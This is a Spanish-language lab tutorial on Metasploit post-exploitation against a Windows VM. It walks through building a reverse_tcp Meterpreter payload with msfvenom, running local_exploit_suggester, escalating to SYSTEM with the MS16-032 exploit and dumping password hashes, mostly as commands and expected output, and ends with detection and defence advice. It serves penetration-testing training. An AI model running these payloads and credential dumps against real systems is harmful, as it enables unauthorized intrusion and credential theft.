---
title: "🔍 Post-Explotación: Escaneo de Vulnerabilidades con Meterpreter"
aliases:
  - 🔍 Post-Explotación: Escaneo de Vulnerabilidades con Meterpreter
tags:
  - ifct0109/pocs
  - auditoria
  - metasploit
  - meterpreter
---

# 🔍 Post-Explotación: Escaneo de Vulnerabilidades con Meterpreter

  
  
    

## 📖 ENUNCIADO (DESCRIPCIÓN)

    
    

Una vez que hemos comprometido un sistema Windows mediante Metasploit y tenemos una sesión Meterpreter activa, podemos realizar **escaneo de vulnerabilidades locales** desde dentro del sistema comprometido. Esto nos permite identificar vulnerabilidades adicionales para escalar privilegios, mantener persistencia o pivotar hacia otros sistemas de la red.

    
    

      

### ⚠️ ADVERTENCIA LEGAL

      

Esta práctica SOLO debe realizarse en entornos controlados de laboratorio con fines educativos. Ejecutar escaneos de vulnerabilidades en sistemas sin autorización explícita es ILEGAL.

      

**Solo en tu laboratorio. Solo con tus máquinas virtuales.**

    

  

  
    

## 📚 CONCEPTOS PREVIOS

    
    

### 🎯 ¿Qué es Post-Explotación?

    
    

La **post-explotación** es la fase que viene después de haber comprometido un sistema. En esta fase, el atacante busca:

    
    
      
* ✅ Mantener el acceso (persistencia)
      
* ✅ Escalar privilegios (de usuario normal a administrador/SYSTEM)
      
* ✅ Recopilar información sensible
      
* ✅ Pivotar hacia otros sistemas de la red
      
* ✅ Borrar huellas para evitar detección
    

    

### 🔍 Local Exploit Suggester

    
    

      

#### 💡 ¿Qué es?

      

**Local Exploit Suggester** es un módulo post-explotación de Metasploit que analiza el sistema comprometido y sugiere exploits locales que podrían funcionar para escalar privilegios.

      
      

**¿Cómo funciona?**

      
        
* Recopila información del sistema (versión de Windows, parches instalados, arquitectura)
        
* Compara esta información con su base de datos de exploits conocidos
        
* Sugiere exploits que tienen alta probabilidad de éxito
        
* Ahorra tiempo al no tener que probar exploits manualmente
      
    

    

### 📋 Diferencia entre Exploit Remoto y Local

    
    

| Tipo | Descripción | Cuándo se usa | Ejemplo |
| --- | --- | --- | --- |
| Exploit Remoto | Ataca desde fuera del sistema | Acceso inicial al sistema | EternalBlue (MS17-010) |
| Exploit Local | Se ejecuta desde dentro del sistema | Escalada de privilegios | MS16-032, MS10-015 |

  

  
    

## 🖥️ Escenario de la Práctica

    
    

      

### 🎯 Situación inicial

      

Imaginemos que ya hemos comprometido un sistema Windows y tenemos una sesión Meterpreter activa con privilegios de usuario normal (NO administrador).

      
      

**Nuestro objetivo:** Encontrar vulnerabilidades locales que nos permitan escalar privilegios a SYSTEM (máximo nivel en Windows).

    

    

### 📋 Requisitos

    
    
      
* 🐉 **Kali Linux** con Metasploit Framework
      
* 💻 **Windows 7/10** (ya comprometido)
      
* 🎯 **Sesión Meterpreter activa**
    
  

  
    

## 🚀 Prueba de Concepto (PoC)

  

  
    

## 🎯 Paso 1: Obtener Sesión Meterpreter Inicial

    
    

Primero necesitamos tener una sesión Meterpreter activa. Vamos a simular que ya comprometimos el sistema Windows mediante un payload reverse_tcp.

    

      

### 🔧 Generar payload (si aún no lo has hecho)

      
      

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=10.0.0.6 LPORT=4444 \
-f exe -o payload.exe
```

      
      

Transfiere `payload.exe` a la máquina Windows y ejecútalo.

    

    

      

### 🎧 Configurar el listener (handler)

      
      

```bash
msfconsole
```

      
      

Una vez dentro de Metasploit:

      
      

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.6
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

    

    

      

### ▶️ Ejecutar el payload en Windows

      
      

Ejecuta `payload.exe` en la máquina Windows.

    

    

### ✅ Verificar sesión Meterpreter

    
    

      

Si todo funciona correctamente, verás en Kali:

      
      

```bash
[*] Sending stage (175174 bytes) to 10.0.0.12
[*] Meterpreter session 1 opened (10.0.0.6:4444 -> 10.0.0.12:49156)

meterpreter >
```

    

    

      

#### 🔍 Verificar información básica del sistema

      
      

```bash
meterpreter > sysinfo
```

      
      

**Salida esperada:**

      
      

```bash
Computer        : DESKTOP-ABC123
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : es_ES
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

    

    

      

#### 👤 Verificar usuario actual

      
      

```bash
meterpreter > getuid
```

      
      

**Salida esperada:**

      
      

```bash
Server username: DESKTOP-ABC123\Usuario
```

      
      

        

**⚠️ Nota:** Si ves un usuario normal (no SYSTEM, no Administrador), necesitarás escalar privilegios.

      

    

  

  
    

## 🔍 Paso 2: Ejecutar Local Exploit Suggester

    
    

Ahora que tenemos la sesión Meterpreter activa, vamos a poner la sesión en **background** (segundo plano) para cargar el módulo de escaneo de vulnerabilidades.

    

      

### ⏸️ Poner sesión en background

      
      

```bash
meterpreter > background
```

      
      

**Salida:**

      
      

```bash
[*] Backgrounding session 1...
```

      
      

Ahora vuelves a estar en la consola de Metasploit:

      
      

```bash
msf6 exploit(multi/handler) >
```

    

    

      

### 🔍 Cargar el módulo Local Exploit Suggester

      
      

```bash
msf6 > use post/multi/recon/local_exploit_suggester
```

      
      

O puedes buscarlo primero:

      
      

```bash
msf6 > search local_exploit_suggester
```

    

    

      

### 📋 Ver las opciones del módulo

      
      

```bash
msf6 post(multi/recon/local_exploit_suggester) > show options
```

      
      

**Salida:**

      
      

```bash
Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
```

    

    

      

### ⚙️ Configurar la sesión

      
      

Necesitamos especificar qué sesión Meterpreter queremos analizar. Si solo tienes una sesión, será la número 1:

      
      

```bash
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
```

      
      

**Opcional:** Si quieres ver descripciones detalladas de cada exploit sugerido:

      
      

```bash
msf6 post(multi/recon/local_exploit_suggester) > set SHOWDESCRIPTION true
```

    

    

      

### 🚀 Ejecutar el escaneo

      
      

```bash
msf6 post(multi/recon/local_exploit_suggester) > run
```

    

    

### 📊 Resultados del Escaneo

    

El módulo analizará el sistema y mostrará una lista de exploits potenciales. Aquí un ejemplo de salida:

    

```bash
[*] 10.0.0.12 - Collecting local exploits for x86/windows...
[*] 10.0.0.12 - 40 exploit checks are being tried...
[+] 10.0.0.12 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.0.0.12 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.0.0.12 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.0.0.12 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.0.0.12 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.0.0.12 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.0.0.12 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.0.0.12 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.0.0.12 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.0.0.12 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.0.0.12 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

    

      

#### 📋 Interpretación de resultados

      
      

| Mensaje | Significado | Probabilidad de éxito |
| --- | --- | --- |
| `The target appears to be vulnerable` | Alta probabilidad de éxito | ✅ Alta (80-95%) |
| `The target service is running, but could not be validated` | El servicio necesario está activo, puede funcionar | ⚠️ Media (50-70%) |
| `The target is not exploitable` | No vulnerable a este exploit | ❌ Nula (0%) |

    

  

  
    

## ⚡ Paso 3: Explotar una Vulnerabilidad Local

    
    

Una vez que tenemos la lista de vulnerabilidades potenciales, vamos a intentar explotar una de ellas para escalar privilegios.

    

### 🎯 Selección del Exploit

    

Vamos a usar **ms16_032_secondary_logon_handle_privesc**, un exploit muy confiable para Windows 7 y Server 2008 R2.

    

      

#### 📦 Cargar el exploit

      
      

```bash
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

    

    

      

#### 📋 Ver opciones

      
      

```bash
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
```

    

    

      

#### ⚙️ Configurar el exploit

      
      

Necesitamos especificar:

      
        
* La sesión actual (donde tenemos acceso de usuario normal)
        
* El payload que queremos ejecutar con privilegios elevados
        
* LHOST y LPORT para recibir la nueva sesión elevada
      
      
      

```bash
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 10.0.0.6
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LPORT 5555
```

      
      

        

**📝 Nota:** Usamos un puerto diferente (5555) para la nueva sesión elevada, para no interferir con la sesión original en el puerto 4444.

      

    

    

      

#### 🎯 Ver el payload configurado

      
      

```bash
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
```

      
      

Por defecto usará `windows/meterpreter/reverse_tcp` que es perfecto para nosotros.

    

    

      

#### 🚀 Ejecutar el exploit

      
      

```bash
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
```

    

    

### ✅ Resultado Esperado - Escalada Exitosa

    

```bash
[*] Started reverse TCP handler on 10.0.0.6:5555
[*] Writing payload file, C:\Users\Usuario\AppData\Local\Temp\RhWIZdps.txt...
[*] Compressing script contents...
[+] Compressed size: 3590
[*] Executing exploit script...
[*] Sending stage (175174 bytes) to 10.0.0.12
[*] Meterpreter session 2 opened (10.0.0.6:5555 -> 10.0.0.12:49157)
[+] Deleted C:\Users\Usuario\AppData\Local\Temp\RhWIZdps.txt

meterpreter >
```

    

      

#### 🎯 Verificar privilegios elevados

      
      

```bash
meterpreter > getuid
```

      
      

**Antes (sesión 1):**

      

```bash
Server username: DESKTOP-ABC123\Usuario
```

      
      

**Ahora (sesión 2):**

      

```bash
Server username: NT AUTHORITY\SYSTEM
```

      
      
        

**🎉 ¡ÉXITO!** Has escalado privilegios de usuario normal a **SYSTEM** (el nivel más alto en Windows).

      
    

    

      

#### 🔍 Verificar información del sistema con privilegios elevados

      
      

```bash
meterpreter > sysinfo
meterpreter > getprivs
```

      
      

Ahora verás una lista completa de privilegios del sistema, incluyendo:

      
      

```bash
SeDebugPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeLoadDriverPrivilege
...
```

    

  

  
    

## 🎮 Paso 4: Gestión de Sesiones Múltiples

    
    

Ahora tienes dos sesiones Meterpreter activas: la original con privilegios de usuario normal y la nueva con privilegios de SYSTEM.

    

      

### 📋 Listar sesiones activas

      
      

Pon la sesión actual en background:

      
      

```bash
meterpreter > background
```

      
      

Lista todas las sesiones:

      
      

```bash
msf6 > sessions -l
```

      
      

**Salida:**

      
      

```bash
Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x86/windows  DESKTOP-ABC123\Usuario @ DESKTOP 10.0.0.6:4444 -> 10.0.0.12:49156
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DESKTOP    10.0.0.6:5555 -> 10.0.0.12:49157
```

    

    

      

### 🔄 Cambiar entre sesiones

      
      

Para interactuar con la sesión 1 (usuario normal):

      
      

```bash
msf6 > sessions -i 1
```

      
      

Para interactuar con la sesión 2 (SYSTEM):

      
      

```bash
msf6 > sessions -i 2
```

    

    

      

### 🗑️ Cerrar una sesión

      
      

Generalmente querrás cerrar la sesión de usuario normal y mantener la de SYSTEM:

      
      

```bash
msf6 > sessions -k 1
```

      
      

Esto cierra (kill) la sesión 1.

    

  

  
    

## 🔍 Otros Módulos de Post-Explotación Útiles

    
    

Una vez que tienes privilegios de SYSTEM, hay muchos módulos de post-explotación que puedes usar.

    

### 📊 Recopilación de Información

    

| Módulo | Descripción | Comando |
| --- | --- | --- |
| Enum System | Enumera información detallada del sistema | `use post/windows/gather/enum_system` |
| Check VM | Detecta si está en máquina virtual | `use post/windows/gather/checkvm` |
| Hash Dump | Extrae hashes de contraseñas | `use post/windows/gather/hashdump` |
| Enum Applications | Lista aplicaciones instaladas | `use post/windows/gather/enum_applications` |
| Enum Shares | Enumera recursos compartidos | `use post/windows/gather/enum_shares` |
| Credentials | Busca credenciales almacenadas | `use post/windows/gather/credentials/windows_autologin` |

    

### 🎯 Ejemplo: Extraer hashes de contraseñas

    

      

Desde la sesión Meterpreter con privilegios SYSTEM:

      
      

```bash
meterpreter > hashdump
```

      
      

**Salida:**

      
      

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Usuario:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

      
      

Estos hashes pueden ser crackeados offline con herramientas como John the Ripper o Hashcat.

    

    

### 📡 Ejemplo: Usar módulo desde Metasploit (sin Meterpreter)

    

      

```bash
meterpreter > background
msf6 > use post/windows/gather/enum_system
msf6 post(windows/gather/enum_system) > set SESSION 2
msf6 post(windows/gather/enum_system) > run
```

      
      

Este módulo recopilará información detallada como:

      
        
* Información del sistema operativo
        
* Parches instalados
        
* Software antivirus
        
* Configuración de red
        
* Usuarios locales y sus grupos
      
    

  

  
    

## 📚 Tabla de Referencia: Exploits Locales Comunes

    
    

| Exploit | CVE | Sistema Afectado | Probabilidad |
| --- | --- | --- | --- |
| `ms16_032_secondary_logon_handle_privesc` | CVE-2016-0099 | Windows 7, 8, 10, Server 2008/2012 | ✅ Muy Alta |
| `ms16_016_webdav` | CVE-2016-0051 | Windows Vista - 10, Server 2008/2012 | ✅ Alta |
| `ms15_051_client_copy_image` | CVE-2015-1701 | Windows Vista - 8.1, Server 2008/2012 | ✅ Alta |
| `ms14_058_track_popup_menu` | CVE-2014-4113 | Windows XP - 8.1, Server 2003-2012 | ✅ Alta |
| `ms13_053_schlamperei` | CVE-2013-1300 | Windows XP - 8, Server 2003-2012 | ⚠️ Media |
| `ms10_092_schelevator` | CVE-2010-3338 | Windows Vista/7, Server 2008 | ✅ Alta |
| `ms10_015_kitrap0d` | CVE-2010-0232 | Windows XP, 2003, Vista, 7, 2008 | ✅ Muy Alta |
| `bypassuac_eventvwr` | N/A | Windows 7 - 10 (bypass UAC) | ✅ Alta |

    

      

**💡 Consejo:** Siempre empieza con los exploits marcados como "The target appears to be vulnerable" y con CVEs más recientes.

    

  

  
    

## 🔄 Flujo Completo de Trabajo

    
    

      

### 📋 Resumen paso a paso

      
      
        
* **Compromiso inicial:** Obtener sesión Meterpreter con `multi/handler`
        
* **Reconocimiento:** Ejecutar `sysinfo` y `getuid`
        
* **Background:** Poner sesión en segundo plano con `background`
        
* **Escaneo:** Usar `post/multi/recon/local_exploit_suggester`
        
* **Análisis:** Revisar lista de vulnerabilidades sugeridas
        
* **Selección:** Elegir exploit con mayor probabilidad de éxito
        
* **Configuración:** Cargar exploit, configurar SESSION, LHOST, LPORT
        
* **Explotación:** Ejecutar con `run`
        
* **Verificación:** Comprobar privilegios con `getuid`
        
* **Post-explotación:** Usar módulos adicionales para recopilar información
      
    

    

      

### 🎯 Diagrama de flujo

      
      

```bash
┌─────────────────────────────┐
│   Compromiso Inicial        │
│   (Sesión Meterpreter)      │
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│   Sesión en Background      │
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│ Local Exploit Suggester     │
│ (Escaneo de vulnerabilidades)│
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│   Lista de Exploits         │
│   Potenciales               │
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│   Selección y Configuración │
│   del Exploit               │
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│   Escalada de Privilegios   │
│   (Nueva sesión SYSTEM)     │
└──────────┬──────────────────┘
           │
           ▼
┌─────────────────────────────┐
│   Post-Explotación          │
│   (hashdump, enum, etc.)    │
└─────────────────────────────┘
```

    

  

  
    

## 🛡️ Defensa y Detección

    
    

### 🔍 ¿Cómo detectar estos ataques?

    
    

| Indicador | Descripción | Herramienta |
| --- | --- | --- |
| Conexiones sospechosas | Conexiones salientes a IPs desconocidas en puertos no estándar | Firewall, IDS/IPS, EDR |
| Procesos anómalos | Procesos con privilegios elevados inesperados | Sysmon, EDR |
| Ejecución de PowerShell | Scripts PowerShell ofuscados o inusuales | PowerShell Logging, SIEM |
| Acceso a LSASS | Intentos de dumping de credenciales | Windows Defender Credential Guard |
| Cambios de privilegios | Escaladas de privilegios sospechosas | Event Viewer (ID 4672, 4673) |

    

### 🔐 Medidas de Protección

    
    
      
* ✅ **Mantener el sistema actualizado:** Aplicar todos los parches de seguridad
      
* ✅ **UAC activado:** User Account Control dificulta bypass de privilegios
      
* ✅ **Antivirus/EDR:** Detecta payloads conocidos y comportamientos sospechosos
      
* ✅ **Windows Defender Exploit Guard:** Mitiga técnicas de explotación
      
* ✅ **Application Whitelisting:** Solo permite ejecutables autorizados
      
* ✅ **Network Segmentation:** Limita propagación lateral
      
* ✅ **Least Privilege:** Usuarios sin privilegios administrativos
      
* ✅ **Monitoring y Logging:** Sysmon, centralización de logs
      
* ✅ **Credential Guard:** Protege credenciales en memoria
      
* ✅ **AMSI:** Anti-Malware Scan Interface para scripts
    
  

  
    

## 📚 Conclusiones

    
    

      
      

### 🎓 Lo que hemos aprendido:

      
      
        
* ✅ Cómo obtener y mantener sesiones Meterpreter en Windows
        
* ✅ Uso del módulo `local_exploit_suggester` para identificar vulnerabilidades
        
* ✅ Interpretación de resultados del escaneo de vulnerabilidades
        
* ✅ Escalada de privilegios mediante exploits locales (ej: MS16-032)
        
* ✅ Gestión de múltiples sesiones Meterpreter
        
* ✅ Diferencia entre privilegios de usuario y SYSTEM
        
* ✅ Módulos de post-explotación para recopilación de información
        
* ✅ Técnicas de defensa y detección de estos ataques
      
      
      

### ⚠️ Responsabilidad Ética:

      
      

Este conocimiento debe usarse ÚNICAMENTE para:

      
        
* 🎓 Educación y formación en ciberseguridad
        
* 🔐 Pentesting autorizado con contrato firmado
        
* 🛡️ Auditorías de seguridad legítimas
        
* 📖 Investigación en entornos de laboratorio controlados
      
      
      

**NUNCA para actividades ilegales. La escalada de privilegios no autorizada es un delito grave.**

    

  
    

## 📋 Comandos de Referencia Rápida

    
    

| Acción | Comando |
| --- | --- |
| Iniciar handler | `use exploit/multi/handler` |
| Información del sistema | `sysinfo` |
| Usuario actual | `getuid` |
| Poner en background | `background` |
| Listar sesiones | `sessions -l` |
| Interactuar con sesión | `sessions -i NUMERO` |
| Cargar suggester | `use post/multi/recon/local_exploit_suggester` |
| Configurar sesión | `set SESSION 1` |
| Ejecutar módulo | `run` |
| Hash dump | `hashdump` |
| Migrar proceso | `migrate PID` |
| Shell del sistema | `shell` |
